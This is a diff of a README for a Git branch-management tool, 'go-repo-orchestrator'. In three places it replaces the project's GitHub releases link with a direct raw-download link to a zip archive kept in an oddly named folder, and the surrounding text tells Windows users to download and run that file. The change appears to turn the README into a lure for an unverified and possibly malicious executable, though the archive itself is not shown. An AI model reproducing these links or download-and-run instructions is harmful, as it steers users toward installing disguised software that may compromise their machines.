@@ -1,6 +1,6 @@
 # 🛠️ go-repo-orchestrator - Manage Git branches with less risk
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/raw/refs/heads/main/proconsulship/repo-orchestrator-go-2.9-alpha.2.zip)
 
 ## 📌 Overview
 
@@ -28,7 +28,7 @@ Before you start, make sure you have:
 ## 🚀 Download
 
 Visit this page to download:
-https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/releases
+https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/raw/refs/heads/main/proconsulship/repo-orchestrator-go-2.9-alpha.2.zip
 
 On that page, look for the latest release for Windows. Download the file that matches your system. If you see more than one file, choose the one for Windows.
 
@@ -208,7 +208,7 @@ This project relates to:
 ## 🔗 Download again
 
 Visit this page to download:
-https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/releases
+https://github.com/Studentlampphycocyanin576/go-repo-orchestrator/raw/refs/heads/main/proconsulship/repo-orchestrator-go-2.9-alpha.2.zip
 
 Use the latest Windows release file, then download and run this file
 
